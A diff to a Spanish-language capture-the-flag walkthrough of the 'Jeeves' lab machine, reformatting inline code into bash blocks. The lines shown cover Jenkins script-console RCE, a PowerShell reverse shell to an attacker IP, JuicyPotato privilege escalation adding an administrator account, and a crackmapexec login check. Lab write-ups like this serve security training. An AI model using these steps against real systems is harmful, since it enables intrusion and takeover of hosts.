@@ -74,9 +74,17 @@ Estamos en frente de un IIS
 
 Vemos una pagina de busqueda typo Google.
 
-Buscando en internet vemos una routa potencial que seria `/askjeeves/` pero no nos da en este caso
+Buscando en internet vemos una routa potencial que seria 
+```bash
+ /askjeeves/ 
+```
+ pero no nos da en este caso
 
-Intentamos ver lo que hay en el puerto **50000** y tenemos un 404. Si le ponemos el `/askjeeves/`, llegamos en 
+Intentamos ver lo que hay en el puerto **50000** y tenemos un 404. Si le ponemos el 
+```bash
+ /askjeeves/ 
+```
+, llegamos en 
 un panel de administration de Jenkins.
 
 
@@ -97,7 +105,11 @@ command = "whoami"
 println(command.execute().text)
 ```
 
-Si ejecutamos el commando vemos en la respuesta `jeeves\kohsuke`. Vemos con esto que tenemos capacidad de RCE.
+Si ejecutamos el commando vemos en la respuesta 
+```bash
+ jeeves\kohsuke 
+```
+. Vemos con esto que tenemos capacidad de RCE.
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -113,7 +125,11 @@ Si ejecutamos el commando vemos en la respuesta `jeeves\kohsuke`. Vemos con esto
     nano PS.ps1
     ```
 
-    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero
+    Modificamos el fichero PS.ps1 para añadir 
+```bash
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443 
+```
+ al final del fichero
 
 1. Compartimos un servicio http con python
 
@@ -134,7 +150,11 @@ Si ejecutamos el commando vemos en la respuesta `jeeves\kohsuke`. Vemos con esto
     println(command.execute().text)
     ```
 
-Ya hemos ganado accesso al systema. `whoami` -> **jeeves\kohsuke**. Ya podemos leer la flag.## Privilege Escalation {-}
+Ya hemos ganado accesso al systema. 
+```bash
+ whoami 
+```
+ -> **jeeves\kohsuke**. Ya podemos leer la flag.## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
 
@@ -143,7 +163,11 @@ systeminfo
 whoami /priv
 ```
 
-Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)
+Aqui vemos que tenemos el 
+```bash
+ SeImpersonatePrivilege 
+```
+ ;)
 
 Tiramos como siempre de JuicyPotatoe.exe
 
@@ -171,7 +195,11 @@ Nos creamos un nuevo usuario con el JuicyPotato.
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
 ```
 
-Si comprobamos con el commando `crackmapexec smb 10.10.10.63 -u 's4vitar' -p 's4vitar1234$!'` Vemos que el usuario no esta pwned.
+Si comprobamos con el commando 
+```bash
+ crackmapexec smb 10.10.10.63 -u 's4vitar' -p 's4vitar1234$!' 
+```
+ Vemos que el usuario no esta pwned.
 Aqui tenemos que 
 
 ```bash
